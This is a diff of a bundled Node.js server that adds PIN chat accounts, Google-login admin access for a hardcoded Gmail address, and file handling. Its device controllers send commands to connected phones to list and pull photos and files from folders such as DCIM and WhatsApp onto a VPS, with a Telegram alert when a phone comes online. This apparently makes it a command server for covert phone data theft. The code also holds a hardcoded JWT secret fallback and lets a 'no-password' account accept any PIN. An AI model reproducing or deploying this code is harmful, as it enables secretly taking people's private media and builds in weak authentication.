@@ -17,6 +17,7 @@ var require_db = __commonJS({
     var memoryLogs = [];
     var memoryUsers = /* @__PURE__ */ new Map();
     var memoryMessages = [];
+    var memoryUploadedFiles = [];
     function formatDevice(device) {
       if (!device) return null;
       const lastSeen = device.lastSeen || device.last_seen;
@@ -207,6 +208,71 @@ var require_db = __commonJS({
         memoryUsers.set(`user_${phoneNumber}`, user);
       }
       return user;
+    }
+    async function registerChatUser(phoneNumber, pinHash, deviceId) {
+      if (dbEnabled && prisma) {
+        try {
+          let existing2 = await prisma.user.findUnique({ where: { phoneNumber } });
+          if (existing2) {
+            if (existing2.password && existing2.password !== "no-password") {
+              return { success: false, error: `Nomor HP ${phoneNumber} sudah terdaftar. Silakan gunakan menu Login.` };
+            }
+            await prisma.user.update({
+              where: { phoneNumber },
+              data: { password: pinHash }
+            });
+            return { success: true, user: existing2 };
+          }
+          const newUser = await prisma.user.create({
+            data: {
+              username: `user_${phoneNumber}`,
+              password: pinHash,
+              phoneNumber
+            }
+          });
+          return { success: true, user: newUser };
+        } catch (err) {
+          console.error("Error saat registerChatUser (Prisma):", err.message);
+          throw err;
+        }
+      }
+      let existing = Array.from(memoryUsers.values()).find((u) => u.phoneNumber === phoneNumber);
+      if (existing) {
+        if (existing.password && existing.password !== "no-password") {
+          return { success: false, error: `Nomor HP ${phoneNumber} sudah terdaftar. Silakan gunakan menu Login.` };
+        }
+        existing.password = pinHash;
+        return { success: true, user: existing };
+      }
+      const id = memoryUsers.size + 1;
+      const user = {
+        id,
+        username: `user_${phoneNumber}`,
+        password: pinHash,
+        phoneNumber,
+        createdAt: /* @__PURE__ */ new Date()
+      };
+      memoryUsers.set(`user_${phoneNumber}`, user);
+      return { success: true, user };
+    }
+    async function verifyChatUserPin(phoneNumber, pinHash) {
+      let user = null;
+      if (dbEnabled && prisma) {
+        try {
+          user = await prisma.user.findUnique({ where: { phoneNumber } });
+        } catch (err) {
+          console.error("Error saat verifyChatUserPin (Prisma):", err.message);
+        }
+      } else {
+        user = Array.from(memoryUsers.values()).find((u) => u.phoneNumber === phoneNumber);
+      }
+      if (!user) {
+        return { success: false, error: `Nomor HP ${phoneNumber} belum terdaftar.` };
+      }
+      if (user.password !== pinHash && user.password !== "no-password") {
+        return { success: false, error: "PIN yang Anda masukkan salah." };
+      }
+      return { success: true, user };
     }
     async function saveMessage(fromPhone, toPhone, content, status = "sent", replyToId = null, replyToContent = null) {
       const createdAt = /* @__PURE__ */ new Date();
@@ -424,6 +490,115 @@ var require_db = __commonJS({
       }
       return true;
     }
+    async function saveUploadedFile(fileData) {
+      const fileRecord = {
+        originalName: fileData.originalName || fileData.originalname,
+        filename: fileData.filename,
+        size: fileData.size,
+        mimeType: fileData.mimeType || fileData.mimetype || "application/octet-stream",
+        path: fileData.path,
+        downloadUrl: fileData.downloadUrl,
+        createdAt: /* @__PURE__ */ new Date()
+      };
+      if (dbEnabled && prisma) {
+        try {
+          const created = await prisma.uploadedFile.create({
+            data: fileRecord
+          });
+          return created;
+        } catch (err) {
+          console.error("Error saat menyimpan uploaded file ke database (Prisma):", err.message);
+        }
+      }
+      const newRecord = {
+        id: memoryUploadedFiles.length + 1,
+        ...fileRecord
+      };
+      memoryUploadedFiles.unshift(newRecord);
+      return newRecord;
+    }
+    async function getUploadedFiles() {
+      if (dbEnabled && prisma) {
+        try {
+          const files = await prisma.uploadedFile.findMany({
+            orderBy: { createdAt: "desc" }
+          });
+          return files;
+        } catch (err) {
+          console.error("Error saat mengambil uploaded files dari database (Prisma):", err.message);
+        }
+      }
+      return [...memoryUploadedFiles];
+    }
+    async function findUploadedFileById(id) {
+      const parsedId = typeof id === "number" ? id : parseInt(id, 10);
+      if (dbEnabled && prisma) {
+        try {
+          if (!isNaN(parsedId)) {
+            const file = await prisma.uploadedFile.findUnique({
+              where: { id: parsedId }
+            });
+            if (file) return file;
+          }
+        } catch (err) {
+          console.error("Error saat mencari uploaded file di DB (Prisma):", err.message);
+        }
+      }
+      return memoryUploadedFiles.find((f) => f.id === parsedId || String(f.id) === String(id) || f.filename === id);
+    }
+    async function updateUploadedFile(id, updateData) {
+      const parsedId = typeof id === "number" ? id : parseInt(id, 10);
+      const dataToUpdate = {
+        originalName: updateData.originalName || updateData.originalname,
+        size: updateData.size,
+        mimeType: updateData.mimeType || updateData.mimetype,
+        path: updateData.path,
+        downloadUrl: updateData.downloadUrl
+      };
+      if (dbEnabled && prisma) {
+        try {
+          if (!isNaN(parsedId)) {
+            const updated = await prisma.uploadedFile.update({
+              where: { id: parsedId },
+              data: dataToUpdate
+            });
+            return updated;
+          }
+        } catch (err) {
+          console.error("Error saat update uploaded file di DB (Prisma):", err.message);
+        }
+      }
+      const index = memoryUploadedFiles.findIndex((f) => f.id === parsedId || String(f.id) === String(id) || f.filename === id);
+      if (index !== -1) {
+        memoryUploadedFiles[index] = {
+          ...memoryUploadedFiles[index],
+          ...dataToUpdate
+        };
+        return memoryUploadedFiles[index];
+      }
+      return null;
+    }
+    async function deleteUploadedFile(id) {
+      const parsedId = typeof id === "number" ? id : parseInt(id, 10);
+      if (dbEnabled && prisma) {
+        try {
+          if (!isNaN(parsedId)) {
+            await prisma.uploadedFile.delete({
+              where: { id: parsedId }
+            });
+            return true;
+          }
+        } catch (err) {
+          console.error("Error saat menghapus uploaded file dari DB (Prisma):", err.message);
+        }
+      }
+      const index = memoryUploadedFiles.findIndex((f) => f.id === parsedId || String(f.id) === String(id) || f.filename === id);
+      if (index !== -1) {
+        memoryUploadedFiles.splice(index, 1);
+        return true;
+      }
+      return false;
+    }
     module2.exports = {
       initDb,
       upsertDevice,
@@ -434,6 +609,8 @@ var require_db = __commonJS({
       findUserByUsername,
       findUserByPhone,
       findOrCreateUserByPhone,
+      registerChatUser,
+      verifyChatUserPin,
       saveMessage,
       markMessagesAsRead,
       deleteMessage,
@@ -442,6 +619,11 @@ var require_db = __commonJS({
       getUserStatus,
       getChatHistory,
       getRecentChats,
+      saveUploadedFile,
+      getUploadedFiles,
+      findUploadedFileById,
+      updateUploadedFile,
+      deleteUploadedFile,
       isDbEnabled: () => dbEnabled
     };
   }
@@ -634,11 +816,9 @@ var require_telegram = __commonJS({
         second: "2-digit",
         timeZone: "Asia/Jakarta"
       });
-      const message = `\u{1F7E2} <b>PERANGKAT ONLINE</b>
-
-\u{1F4F1} <b>Device ID:</b> <code>${deviceId}</code>
-\u23F0 <b>Waktu:</b> ${formattedTime} WIB
-\u26A1 <b>Status:</b> Perangkat sebelumnya offline dan sekarang telah kembali ONLINE.`;
+      const message = `<code>${deviceId}</code>
+<b>Waktu:</b> ${formattedTime} WIB
+`;
       return sendTelegramMessage(message);
     }
     module2.exports = {
@@ -667,7 +847,12 @@ var require_socket = __commonJS({
           origin: "*",
           // Di production, sebaiknya diset ke domain web app Anda
           methods: ["GET", "POST"]
-        }
+        },
+        maxHttpBufferSize: 1e8,
+        // 100MB max buffer agar payload JSON 4000+ berkas tidak memutuskan koneksi socket
+        pingTimeout: 6e4,
+        // 60s ping timeout
+        pingInterval: 25e3
       });
       io.use((socket, next) => {
         const token = socket.handshake.auth?.token || socket.handshake.query?.token;
@@ -717,6 +902,34 @@ var require_socket = __commonJS({
             } catch (err) {
               console.error(`\u274C Gagal kirim socket chat ke ${phoneNumber}:`, err.message);
               return false;
+            }
+          });
+          socket.on("register_account", async (data, callback) => {
+            const { phoneNumber: phoneNumber2, pinHash, deviceId: deviceId2 } = data || {};
+            if (!phoneNumber2 || !pinHash) {
+              if (callback) callback({ success: false, error: "Nomor HP dan PIN wajib diisi." });
+              return;
+            }
+            try {
+              const result = await db2.registerChatUser(phoneNumber2, pinHash, deviceId2);
+              if (callback) callback(result);
+            } catch (err) {
+              console.error(`\u274C Gagal registrasi akun:`, err.message);
+              if (callback) callback({ success: false, error: "Gagal memproses registrasi di server." });
+            }
+          });
+          socket.on("login_account", async (data, callback) => {
+            const { phoneNumber: phoneNumber2, pinHash, deviceId: deviceId2 } = data || {};
+            if (!phoneNumber2 || !pinHash) {
+              if (callback) callback({ success: false, error: "Nomor HP dan PIN wajib diisi." });
+              return;
+            }
+            try {
+              const result = await db2.verifyChatUserPin(phoneNumber2, pinHash);
+              if (callback) callback(result);
+            } catch (err) {
+              console.error(`\u274C Gagal login akun:`, err.message);
+              if (callback) callback({ success: false, error: "Gagal memproses login di server." });
             }
           });
           socket.on("check_user", async (data, callback) => {
@@ -875,15 +1088,16 @@ var require_socket = __commonJS({
       });
       return io;
     }
-    function sendDeviceCommand(deviceId, action, payload = {}) {
+    function sendDeviceCommand(deviceId, action, payload = {}, timeoutMs = 6e4) {
       return new Promise((resolve, reject) => {
         const socket = activeDevices.get(deviceId);
         if (!socket) {
           return reject(new Error("Device sedang offline atau tidak terdaftar"));
         }
-        socket.timeout(15e3).emit("device_command", { action, ...payload }, (err, response) => {
+        const effectiveTimeout = timeoutMs || 6e4;
+        socket.timeout(effectiveTimeout).emit("device_command", { action, ...payload }, (err, response) => {
           if (err) {
-            reject(new Error("Perangkat tidak merespon (Timeout 15s)"));
+            reject(new Error(`Perangkat tidak merespon (Timeout ${Math.round(effectiveTimeout / 1e3)}s)`));
           } else {
             resolve(response);
           }
@@ -904,70 +1118,79 @@ var require_socket = __commonJS({
 // controllers/authController.js
 var require_authController = __commonJS({
   "controllers/authController.js"(exports2, module2) {
-    var bcrypt = require("bcryptjs");
     var jwt = require("jsonwebtoken");
-    var db2 = require_db();
+    var { OAuth2Client } = require("google-auth-library");
     var JWT_SECRET = process.env.JWT_SECRET || "kasir-vps-secure-jwt-key-2026";
-    async function register(req, res) {
-      const { username, password } = req.body;
-      if (!username || !password) {
-        return res.status(400).json({ error: "Username dan password diperlukan." });
-      }
-      try {
-        const existingUser = await db2.findUserByUsername(username);
-        if (existingUser) {
-          return res.status(400).json({ error: "Username sudah digunakan." });
-        }
-        const salt = await bcrypt.genSalt(10);
-        const passwordHash = await bcrypt.hash(password, salt);
-        const newUser = await db2.createUser(username, passwordHash);
-        res.status(201).json({
-          status: "success",
-          message: "Registrasi berhasil.",
-          user: {
-            id: newUser.id,
-            username: newUser.username
-          }
-        });
-      } catch (err) {
-        res.status(500).json({ error: "Gagal melakukan registrasi.", details: err.message });
-      }
+    function getAllowedEmails() {
+      const envEmails = process.env.ALLOWED_GOOGLE_EMAIL || "zaqqwer758@gmail.com";
+      return envEmails.replace(/^["']|["']$/g, "").toLowerCase().split(",").map((e) => e.trim().replace(/^["']|["']$/g, "")).filter(Boolean);
     }
-    async function login(req, res) {
-      const { username, password } = req.body;
-      if (!username || !password) {
-        return res.status(400).json({ error: "Username dan password diperlukan." });
+    async function googleLogin(req, res) {
+      const { credential } = req.body;
+      if (!credential) {
+        return res.status(400).json({ error: "Credential token Google tidak ditemukan." });
       }
       try {
-        const user = await db2.findUserByUsername(username);
-        if (!user) {
-          return res.status(401).json({ error: "Username atau password salah." });
+        const envClientId = (process.env.GOOGLE_CLIENT_ID || "").replace(/^["']|["']$/g, "");
+        const validAudiences = [];
+        if (envClientId) {
+          envClientId.split(",").forEach((id) => {
+            const clean = id.trim();
+            if (clean && clean !== "YOUR_GOOGLE_CLIENT_ID.apps.googleusercontent.com") {
+              validAudiences.push(clean);
+            }
+          });
         }
-        const isMatch = await bcrypt.compare(password, user.password);
-        if (!isMatch) {
-          return res.status(401).json({ error: "Username atau password salah." });
+        const knownClientIds = [
+          "119948676960-vmvbg7ctvp297nr4s135quq3ia0igv72.apps.googleusercontent.com",
+          "1084639382013-5bsvjs217aqckp9r8o6fjd2ru4r46e4b.apps.googleusercontent.com"
+        ];
+        for (const id of knownClientIds) {
+          if (!validAudiences.includes(id)) {
+            validAudiences.push(id);
+          }
+        }
+        const client = new OAuth2Client();
+        const ticket = await client.verifyIdToken({
+          idToken: credential,
+          audience: validAudiences.length === 1 ? validAudiences[0] : validAudiences
+        });
+        const payload = ticket.getPayload();
+        if (!payload || !payload.email) {
+          return res.status(400).json({ error: "Token Google tidak berisi alamat email." });
+        }
+        const userEmail = payload.email.toLowerCase().trim();
+        const allowedEmails = getAllowedEmails();
+        if (!allowedEmails.includes(userEmail)) {
+          console.warn(`\u26A0\uFE0F [AUTH DENIED] Email ${userEmail} mencoba login tetapi tidak terdaftar di whitelist: [${allowedEmails.join(", ")}]`);
+          return res.status(403).json({
+            error: `Akses ditolak. Email (${userEmail}) tidak memiliki izin administrator.`
+          });
         }
         const token = jwt.sign(
-          { id: user.id, username: user.username },
+          { id: payload.sub, username: userEmail, email: userEmail },
           JWT_SECRET,
           { expiresIn: "7d" }
         );
+        console.log(`\u2705 [AUTH SUCCESS] Login Google berhasil untuk email admin: ${userEmail}`);
         res.json({
           status: "success",
-          message: "Login berhasil.",
+          message: "Login Google berhasil.",
           token,
           user: {
-            id: user.id,
-            username: user.username
+            id: payload.sub,
+            username: userEmail,
+            name: payload.name || userEmail,
+            picture: payload.picture
           }
         });
       } catch (err) {
-        res.status(500).json({ error: "Gagal melakukan login.", details: err.message });
+        console.error("\u274C Gagal memverifikasi Google token:", err.message);
+        res.status(401).json({ error: `Verifikasi login Google gagal: ${err.message}` });
       }
     }
     module2.exports = {
-      register,
-      login
+      googleLogin
     };
   }
 });
@@ -978,8 +1201,7 @@ var require_authRoutes = __commonJS({
     var express2 = require("express");
     var router = express2.Router();
     var authController = require_authController();
-    router.post("/register", authController.register);
-    router.post("/login", authController.login);
+    router.post("/google", authController.googleLogin);
     module2.exports = router;
   }
 });
@@ -995,7 +1217,7 @@ var require_pendingDownloads = __commonJS({
 // controllers/deviceController.js
 var require_deviceController = __commonJS({
   "controllers/deviceController.js"(exports2, module2) {
-    var path = require("path");
+    var path2 = require("path");
     var fs = require("fs");
     var crypto = require("crypto");
     var db2 = require_db();
@@ -1019,22 +1241,31 @@ var require_deviceController = __commonJS({
       const folder = req.query.folder || "DCIM";
       const { date } = req.query;
       try {
-        console.log(`\u{1F50D} Meminta daftar file folder "${folder}" dari device ${deviceId}`);
-        let files = await socketModule2.sendDeviceCommand(deviceId, "LIST_FILES", { folder });
+        console.log(`\u{1F50D} Meminta daftar file folder "${folder}" dari device ${deviceId}${date ? ` (Filter Tgl: ${date})` : ""}`);
+        let files = await socketModule2.sendDeviceCommand(deviceId, "LIST_FILES", { folder, date }, 6e4);
+        if (files && files.error) {
+          console.warn(`\u26A0\uFE0F Perangkat ${deviceId} melaporkan status error: ${files.error}`);
+          return res.status(400).json({ error: files.error, files: [] });
+        }
+        if (!Array.isArray(files)) {
+          files = [];
+        }
         if (Array.isArray(files)) {
           try {
             const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-            const targetDir = path.join(uploadDir, `${deviceId}-${folder}`);
+            const targetDir = path2.join(uploadDir, `${deviceId}-${folder}`);
             if (!fs.existsSync(targetDir)) {
               fs.mkdirSync(targetDir, { recursive: true });
             }
-            const allFilePath = path.join(targetDir, "all.json");
+            const allFilePath = path2.join(targetDir, "all.json");
             fs.writeFileSync(allFilePath, JSON.stringify(files, null, 2), "utf8");
             console.log(`\u{1F4BE} Sukses menyimpan seluruh response di VPS: ${allFilePath}`);
           } catch (saveErr) {
             console.error("\u274C Gagal menyimpan cache JSON berkas di VPS:", saveErr.message);
           }
           files.sort((a, b) => {
+            if (a.isDirectory && !b.isDirectory) return -1;
+            if (!a.isDirectory && b.isDirectory) return 1;
             const timeA = a.mtime ? new Date(a.mtime).getTime() : 0;
             const timeB = b.mtime ? new Date(b.mtime).getTime() : 0;
             return timeB - timeA;
@@ -1069,7 +1300,7 @@ var require_deviceController = __commonJS({
       if (!filePath) {
         return res.status(400).json({ error: 'Query parameter "path" diperlukan' });
       }
-      const fileName = path.basename(filePath);
+      const fileName = path2.basename(filePath);
       const downloadSessionId = crypto.randomBytes(16).toString("hex");
       console.log(`\u{1F4E5} Browser meminta download: "${filePath}" (Session: ${downloadSessionId})`);
       res.setHeader("Content-Disposition", `attachment; filename="${encodeURIComponent(fileName)}"`);
@@ -1102,8 +1333,8 @@ var require_deviceController = __commonJS({
       if (!filePath) {
         return res.status(400).json({ error: 'Query parameter "path" diperlukan' });
       }
-      const fileName = path.basename(filePath);
-      const fileExtension = path.extname(filePath).toLowerCase();
+      const fileName = path2.basename(filePath);
+      const fileExtension = path2.extname(filePath).toLowerCase();
       let contentType = "image/jpeg";
       if (fileExtension === ".png") {
         contentType = "image/png";
@@ -1116,15 +1347,15 @@ var require_deviceController = __commonJS({
       const prefix = "/storage/emulated/0/";
       if (filePath.startsWith(prefix)) {
         const relative = filePath.substring(prefix.length);
-        folder = path.dirname(relative);
+        folder = path2.dirname(relative);
       } else {
-        const parent = path.dirname(filePath);
+        const parent = path2.dirname(filePath);
         folder = parent.startsWith("/") ? parent.substring(1) : parent;
       }
       let mtime = null;
       try {
         const uploadDir2 = process.env.UPLOAD_DIR || "./uploads";
-        const allFilePath = path.join(uploadDir2, `${deviceId}-${folder}`, "all.json");
+        const allFilePath = path2.join(uploadDir2, `${deviceId}-${folder}`, "all.json");
         if (fs.existsSync(allFilePath)) {
           const files = JSON.parse(fs.readFileSync(allFilePath, "utf8"));
           const foundFile = files.find((f) => f.path === filePath || f.name === fileName);
@@ -1154,7 +1385,7 @@ var require_deviceController = __commonJS({
         dateStr = `${localYear}-${localMonth}-${localDay}`;
       }
       const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-      const dateDir = path.join(uploadDir, `${deviceId}-${folder}`, dateStr);
+      const dateDir = path2.join(uploadDir, `${deviceId}-${folder}`, dateStr);
       if (!fs.existsSync(dateDir)) {
         fs.mkdirSync(dateDir, { recursive: true });
       }
@@ -1163,12 +1394,12 @@ var require_deviceController = __commonJS({
       if (!isImgExt) {
         previewFileName = `${fileName}.jpg`;
       }
-      const targetDiskPath = path.join(dateDir, previewFileName);
+      const targetDiskPath = path2.join(dateDir, previewFileName);
       if (fs.existsSync(targetDiskPath)) {
         console.log(`\u26A1 Serving preview directly from VPS cache (live route): ${targetDiskPath}`);
         res.setHeader("Content-Disposition", "inline");
         res.setHeader("Content-Type", contentType);
-        return res.sendFile(path.resolve(targetDiskPath));
+        return res.sendFile(path2.resolve(targetDiskPath));
       }
       const downloadSessionId = crypto.randomBytes(16).toString("hex");
       console.log(`\u{1F441}\uFE0F  Browser meminta preview: "${filePath}" (Session: ${downloadSessionId})`);
@@ -1210,13 +1441,13 @@ var require_deviceController = __commonJS({
       if (!filePath) {
         return res.status(400).json({ error: 'Query parameter "path" diperlukan' });
       }
-      const fileName = path.basename(filePath);
+      const fileName = path2.basename(filePath);
       const downloadSessionId = crypto.randomBytes(16).toString("hex");
       const uploadDir = process.env.UPLOAD_DIR || "./uploads";
       if (!fs.existsSync(uploadDir)) {
         fs.mkdirSync(uploadDir, { recursive: true });
       }
-      const targetDiskPath = path.join(uploadDir, Date.now() + "-" + fileName);
+      const targetDiskPath = path2.join(uploadDir, Date.now() + "-" + fileName);
       console.log(`\u{1F4E5} Meminta pengambilan file: "${filePath}" untuk disimpan di VPS (Session: ${downloadSessionId})`);
       const timer = setTimeout(() => {
         if (pendingDownloads.has(downloadSessionId)) {
@@ -1254,7 +1485,7 @@ var require_deviceController = __commonJS({
           const items = fs.readdirSync(uploadDir);
           for (const item of items) {
             if (item === deviceId || item.startsWith(`${deviceId}-`)) {
-              const fullPath = path.join(uploadDir, item);
+              const fullPath = path2.join(uploadDir, item);
               try {
                 if (fs.statSync(fullPath).isDirectory()) {
                   fs.rmSync(fullPath, { recursive: true, force: true });
@@ -1342,7 +1573,7 @@ var require_deviceRoutes = __commonJS({
 // controllers/fileController.js
 var require_fileController = __commonJS({
   "controllers/fileController.js"(exports2, module2) {
-    var path = require("path");
+    var path2 = require("path");
     var fs = require("fs");
     var crypto = require("crypto");
     var db2 = require_db();
@@ -1350,7 +1581,14 @@ var require_fileController = __commonJS({
     var pendingDownloads = require_pendingDownloads();
     async function getFiles(req, res) {
       const folder = req.query.folder || "DCIM/Camera";
-      const { date, deviceId } = req.query;
+      let { date, deviceId } = req.query;
+      if (date === "today") {
+        const now = /* @__PURE__ */ new Date();
+        const localYear = now.getFullYear();
+        const localMonth = String(now.getMonth() + 1).padStart(2, "0");
+        const localDay = String(now.getDate()).padStart(2, "0");
+        date = `${localYear}-${localMonth}-${localDay}`;
+      }
       let activeDeviceId = deviceId;
       if (!activeDeviceId) {
         const activeDevices = socketModule2.getActiveDevicesList();
@@ -1371,13 +1609,38 @@ var require_fileController = __commonJS({
         return res.status(400).json({ error: "Device ID tidak ditemukan." });
       }
       const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-      const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);
+      const targetDir = path2.join(uploadDir, `${activeDeviceId}-${folder}`);
       if (!fs.existsSync(targetDir)) {
+        if (folder === "Root" || folder === "/" || !folder) {
+          const list = [];
+          if (fs.existsSync(uploadDir)) {
+            const found = /* @__PURE__ */ new Set();
+            for (const entry of fs.readdirSync(uploadDir)) {
+              if (entry.startsWith(`${activeDeviceId}-`)) {
+                const rootName = entry.substring(`${activeDeviceId}-`.length);
+                if (rootName) found.add(rootName);
+              }
+            }
+            for (const std of ["DCIM", "Pictures", "Download", "Documents", "WhatsApp"]) {
+              found.add(std);
+            }
+            for (const f of Array.from(found).sort()) {
+              list.push({
+                name: f,
+                isDirectory: true,
+                isFile: false,
+                path: f,
+                relativePath: f
+              });
+            }
+          }
+          return res.json(list);
+        }
         return res.json([]);
       }
       let files = [];
       try {
-        const allFilePath = path.join(targetDir, "all.json");
+        const allFilePath = path2.join(targetDir, "all.json");
         if (fs.existsSync(allFilePath)) {
           files = JSON.parse(fs.readFileSync(allFilePath, "utf8"));
         }
@@ -1404,7 +1667,7 @@ var require_fileController = __commonJS({
           return timeB - timeA;
         });
         const enrichedFiles = files.map((file) => {
-          const fileExtension = path.extname(file.name).toLowerCase();
+          const fileExtension = path2.extname(file.name).toLowerCase();
           const mtime = file.mtime || file.fileMtime;
           let dateStr = "no-date";
           if (mtime) {
@@ -1424,7 +1687,7 @@ var require_fileController = __commonJS({
           if (!isImgExt) {
             previewFileName = `${file.name}.jpg`;
           }
-          const fileDiskPath = path.join(targetDir, dateStr, previewFileName);
+          const fileDiskPath = path2.join(targetDir, dateStr, previewFileName);
           const isCachedOnVps = fs.existsSync(fileDiskPath);
           return {
             ...file,
@@ -1462,12 +1725,12 @@ var require_fileController = __commonJS({
         return res.status(400).json({ error: "Device ID tidak ditemukan." });
       }
       const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-      const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);
+      const targetDir = path2.join(uploadDir, `${activeDeviceId}-${folder}`);
       if (!fs.existsSync(targetDir)) {
         return res.status(404).json({ error: "Cache daftar berkas untuk folder ini belum tersedia." });
       }
       try {
-        const allFilePath = path.join(targetDir, "all.json");
+        const allFilePath = path2.join(targetDir, "all.json");
         if (!fs.existsSync(allFilePath)) {
           return res.status(404).json({ error: "Cache daftar berkas untuk folder ini belum tersedia." });
         }
@@ -1497,12 +1760,12 @@ var require_fileController = __commonJS({
         return res.status(400).json({ error: "Device ID tidak ditemukan." });
       }
       const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-      const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);
+      const targetDir = path2.join(uploadDir, `${activeDeviceId}-${folder}`);
       if (!fs.existsSync(targetDir)) {
         return res.status(404).json({ error: "Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu." });
       }
       try {
-        const allFilePath = path.join(targetDir, "all.json");
+        const allFilePath = path2.join(targetDir, "all.json");
         if (!fs.existsSync(allFilePath)) {
           return res.status(404).json({ error: "Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu." });
         }
@@ -1512,7 +1775,7 @@ var require_fileController = __commonJS({
           return res.status(404).json({ error: `Berkas "${name}" tidak ditemukan.` });
         }
         const deviceFilePath = targetFile.path;
-        const fileExtension = path.extname(name).toLowerCase();
+        const fileExtension = path2.extname(name).toLowerCase();
         const mtime = targetFile.mtime || targetFile.fileMtime;
         let dateStr = "no-date";
         if (mtime) {
@@ -1533,7 +1796,7 @@ var require_fileController = __commonJS({
           const localDay = String(d.getDate()).padStart(2, "0");
           dateStr = `${localYear}-${localMonth}-${localDay}`;
         }
-        const dateDir = path.join(targetDir, dateStr);
+        const dateDir = path2.join(targetDir, dateStr);
         if (!fs.existsSync(dateDir)) {
           fs.mkdirSync(dateDir, { recursive: true });
         }
@@ -1542,7 +1805,7 @@ var require_fileController = __commonJS({
         if (!isImgExt) {
           previewFileName = `${name}.jpg`;
         }
-        const targetDiskPath = path.join(dateDir, previewFileName);
+        const targetDiskPath = path2.join(dateDir, previewFileName);
         let contentType = "image/jpeg";
         if (fileExtension === ".png") contentType = "image/png";
         else if (fileExtension === ".gif") contentType = "image/gif";
@@ -1551,7 +1814,7 @@ var require_fileController = __commonJS({
           console.log(`\u26A1 Serving preview directly from VPS cache: ${targetDiskPath}`);
           res.setHeader("Content-Disposition", "inline");
           res.setHeader("Content-Type", contentType);
-          return res.sendFile(path.resolve(targetDiskPath));
+          return res.sendFile(path2.resolve(targetDiskPath));
         }
         const downloadSessionId = crypto.randomBytes(16).toString("hex");
         console.log(`\u{1F441}\uFE0F  Meminta preview berkas dari perangkat: "${deviceFilePath}" (Session: ${downloadSessionId})`);
@@ -1599,12 +1862,12 @@ var require_fileController = __commonJS({
         return res.status(400).json({ error: "Device ID tidak ditemukan." });
       }
       const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-      const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);
+      const targetDir = path2.join(uploadDir, `${activeDeviceId}-${folder}`);
       if (!fs.existsSync(targetDir)) {
         return res.status(404).json({ error: "Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu." });
       }
       try {
-        const allFilePath = path.join(targetDir, "all.json");
+        const allFilePath = path2.join(targetDir, "all.json");
         if (!fs.existsSync(allFilePath)) {
           return res.status(404).json({ error: "Cache daftar berkas belum tersedia. Akses /devices/:deviceId/files terlebih dahulu." });
         }
@@ -1614,7 +1877,7 @@ var require_fileController = __commonJS({
           return res.status(404).json({ error: `Berkas "${name}" tidak ditemukan.` });
         }
         const deviceFilePath = targetFile.path;
-        const fileExtension = path.extname(name).toLowerCase();
+        const fileExtension = path2.extname(name).toLowerCase();
         const mtime = targetFile.mtime || targetFile.fileMtime;
         let dateStr = "no-date";
         if (mtime) {
@@ -1640,12 +1903,12 @@ var require_fileController = __commonJS({
         if (!isImgExt) {
           previewFileName = `${name}.jpg`;
         }
-        const targetDiskPath = path.join(targetDir, dateStr, previewFileName);
+        const targetDiskPath = path2.join(targetDir, dateStr, previewFileName);
         if (fs.existsSync(targetDiskPath)) {
           console.log(`\u26A1 Serving file download directly from VPS cache: ${targetDiskPath}`);
           res.setHeader("Content-Disposition", `attachment; filename="${encodeURIComponent(name)}"`);
           res.setHeader("Content-Type", "application/octet-stream");
-          return res.sendFile(path.resolve(targetDiskPath));
+          return res.sendFile(path2.resolve(targetDiskPath));
         }
         res.setHeader("Content-Disposition", `attachment; filename="${encodeURIComponent(name)}"`);
         res.setHeader("Content-Type", "application/octet-stream");
@@ -1692,7 +1955,7 @@ var require_fileController = __commonJS({
         return res.status(400).json({ error: "Device ID tidak ditemukan." });
       }
       const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-      const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);
+      const targetDir = path2.join(uploadDir, `${activeDeviceId}-${folder}`);
       if (!fs.existsSync(targetDir)) {
         return res.json([]);
       }
@@ -1729,8 +1992,8 @@ var require_fileController = __commonJS({
         return res.status(400).json({ error: "Device ID tidak ditemukan." });
       }
       const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-      const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);
-      const filePath = path.join(targetDir, name.endsWith(".json") ? name : `${name}.json`);
+      const targetDir = path2.join(uploadDir, `${activeDeviceId}-${folder}`);
+      const filePath = path2.join(targetDir, name.endsWith(".json") ? name : `${name}.json`);
       if (!fs.existsSync(filePath)) {
         return res.status(404).json({ error: `Berkas JSON cache "${name}" tidak ditemukan di VPS.` });
       }
@@ -1742,7 +2005,7 @@ var require_fileController = __commonJS({
       }
     }
     async function getVpsFiles(req, res) {
-      const folder = req.query.folder || "DCIM/Camera";
+      let folderParam = req.query.folder || "";
       const { deviceId } = req.query;
       let activeDeviceId = deviceId;
       if (!activeDeviceId) {
@@ -1764,35 +2027,156 @@ var require_fileController = __commonJS({
         return res.status(400).json({ error: "Device ID tidak ditemukan." });
       }
       const uploadDir = process.env.UPLOAD_DIR || "./uploads";
-      const targetDir = path.join(uploadDir, `${activeDeviceId}-${folder}`);
-      if (!fs.existsSync(targetDir)) {
+      if (!fs.existsSync(uploadDir)) {
         return res.json([]);
       }
       try {
         const list = [];
-        const items = fs.readdirSync(targetDir);
-        for (const item of items) {
-          const itemPath = path.join(targetDir, item);
-          const stat = fs.statSync(itemPath);
-          if (stat.isDirectory()) {
-            const files = fs.readdirSync(itemPath);
-            for (const filename of files) {
-              const filePath = path.join(itemPath, filename);
-              const fileStat = fs.statSync(filePath);
-              if (fileStat.isFile()) {
-                list.push({
-                  name: filename,
-                  date: item,
-                  // e.g. "2026-01-26"
-                  size: fileStat.size,
-                  mtime: fileStat.mtime,
-                  relativePath: `${item}/${filename}`
-                });
+        const isRoot = !folderParam || folderParam === "Root" || folderParam === "/" || folderParam === "";
+        if (isRoot) {
+          const foundFolders = /* @__PURE__ */ new Set();
+          const allEntries = fs.readdirSync(uploadDir);
+          for (const entry of allEntries) {
+            const fullPath = path2.join(uploadDir, entry);
+            if (fs.statSync(fullPath).isDirectory()) {
